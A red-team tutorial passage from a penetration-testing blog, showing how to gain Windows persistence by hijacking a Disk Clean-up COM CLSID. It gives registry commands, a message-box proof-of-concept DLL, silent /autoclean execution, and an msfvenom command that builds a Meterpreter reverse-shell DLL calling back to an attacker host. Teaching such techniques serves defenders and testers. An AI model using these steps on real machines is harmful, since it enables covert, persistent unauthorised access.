---
title: Persistence – Disk Clean-up
url: http://pentestlab.blog/2024/01/29/persistence-disk-clean-up/
source: Over Security - Cybersecurity news aggregator
date: 2025-05-03
fetch_date: 2025-10-06T22:28:27.898403
---

# Persistence – Disk Clean-up

[Skip to content](#content)

[Penetration Testing Lab](https://pentestlab.blog/)

Offensive Techniques & Methodologies

Menu

* [Methodologies](https://pentestlab.blog/methodologies/)
  + [Red Teaming](https://pentestlab.blog/methodologies/red-teaming/)
    - [Credential Access](https://pentestlab.blog/methodologies/red-teaming/credential-access/)
    - [Persistence](https://pentestlab.blog/methodologies/red-teaming/persistence/)
* [Resources](https://pentestlab.blog/resources/)
  + [Papers](https://pentestlab.blog/resources/papers/)
    - [Web Application](https://pentestlab.blog/resources/papers/web-application/)
  + [Presentations](https://pentestlab.blog/resources/presentations/)
    - [Defcon](https://pentestlab.blog/resources/presentations/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/presentations/derbycon/)
    - [Tools](https://pentestlab.blog/resources/presentations/tools/)
  + [Videos](https://pentestlab.blog/resources/videos/)
    - [BSides](https://pentestlab.blog/resources/videos/bsides/)
    - [Defcon](https://pentestlab.blog/resources/videos/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/videos/derbycon/)
    - [Hack In Paris](https://pentestlab.blog/resources/videos/hack-in-paris/)
* [Contact](https://pentestlab.blog/contact-the-lab/)
  + [About Us](https://pentestlab.blog/contact-the-lab/about-us/)

Posted on [January 29, 2024January 23, 2024](https://pentestlab.blog/2024/01/29/persistence-disk-clean-up/)

# Persistence – Disk Clean-up

![Unknown's avatar](https://0.gravatar.com/avatar/9161b274d6d350683293f1e03d228985ac0ff6ac6c89353f4b6bd1a7bc69daf4?s=32&d=identicon&r=G) by [Administrator](https://pentestlab.blog/author/worm1984/).In [Persistence](https://pentestlab.blog/category/red-team/persistence/).[Leave a Comment on Persistence – Disk Clean-up](https://pentestlab.blog/2024/01/29/persistence-disk-clean-up/#respond)

Disk Clean-up is a utility which is part of Windows operating systems and can free up hard drive disk space by deleting mainly cache and temporary files to improve system performance. The utility was introduced in Windows 98 operating systems and even though it has been deprecated and replaced with a modern version in the settings application, Microsoft has not removed it and has kept it as a legacy tool.

From the perspective of Red Teaming it is feasible to utilize the disk clean-up utility to establish persistence by executing arbitrary code when the utility is initiated. Specifically, this method relies on [COM Hijacking](https://pentestlab.blog/2020/05/20/persistence-com-hijacking/) since the *cleanmgr.exe* which is the utility which initiates the Disk Clean-up will examine the Windows registry for a number of DLL’s. Therefore, hijacking one the CLSID’s which is associated with the Disk Clean-up will result in code execution.

[![](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up.png?w=368)](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up.png)

Disk Clean-up

The *Files to delete* functionality is retrieved from the registry and it is not static. If elevation of privileges has been achieved, then it is possible to create registry entries that will cause the *cleanmgr.exe* utility execute an arbitrary DLL. The following registry keys are associated with the functionality of Disk Clean-up:

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\<registry-key-CLSID>
HKCU\Software\Classes\CLSID\{arbitrary-CLSID}
```

Execution of the following command will enumerate the registry keys which are correlated with the *Files to delete* functionality:

```
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches" /s
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-volumecaches.png?w=840)](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-volumecaches.png)

Persistence Disk Clean-up – VolumeCaches Registry Keys

From the registry keys listed, the *Downloaded Program Files* is associated with the *{8369AB20-56C9-11D0-94E8-00AA0059CE02}* CLSID.

[![](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-clsid-downloaded-program-files.png?w=840)](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-clsid-downloaded-program-files.png)

Downloaded Program Files CLSID

Also, this indicated the presence of this CLSID under the following registry key:

```
reg query "HKEY_CLASSES_ROOT\CLSID\{8369AB20-56C9-11D0-94E8-00AA0059CE02}" /s
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-registry-query-clsid.png?w=842)](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-registry-query-clsid.png)

Registry Query CLSID

The following code can be used as a proof of concept to display a message box when the disk clean-up utility is initiated.

```
#include "pch.h"
#include "windows.h"
#include "WinUser.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, (LPCWSTR)L"Visit pentestlab.blog",(LPCWSTR)L"pentestlab", MB_OK);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-visual-studio-messagebox.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-visual-studio-messagebox.png)

Persistence Disk Clean-up – Visual Studio Message Box

The CLSID which is going to be hijacked needs to be created under the following registry key and the subkey of *InprocServer32* under the hijacked CLSID which needs to target the path of the arbitrary DLL.

```
HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-cleanup-dll.png?w=1000)](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-cleanup-dll.png)

Persistence Disk Cleanup – Cleanup DLL

Execution of the command below can enumerate the hijacked CLSID in order to verify that it points to the arbitrary DLL.

```
reg query "HKCU\Software\Classes\CLSID\{8369AB20-56C9-11D0-94E8-00AA0059CE02}" /s
```

Running the *cleanmgr.exe* will execute the code. It should be noted that usage of the parameter */autoclean* will not display to the user the graphical user interface of the Disk Clean-up. Furthermore, it could be combined with other functionality of Windows such as [registry run keys](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/) or [scheduled tasks](https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/) to execute this binary during start-up or at a specific time interval.

```
cleanmgr.exe
cleanmgr.exe /autoclean
cleanmgr.exe /setup
cleanmgr.exe /cleanup
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-messagebox.png?w=836)](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-messagebox.png)

Persistence Disk Clean-up – MessageBox

Metasploit Framework utility *msfvenom* can be used to generated a DLL automatically. Even though this is not a safe method and could lead to a detection during a red team exercise it is used only for the purposes of the article.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.3 LPORT=4444 -f dll -o pentestlab.dll
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-msfvenom.png?w=634)](https://pentestlab.blog/wp-content/uploads/2024/01/persistence-disk-clean-up-msfvenom.png)

Metasploit msfvenom

As previously the DLL needs to be written on the disk and the registry key must be modifi...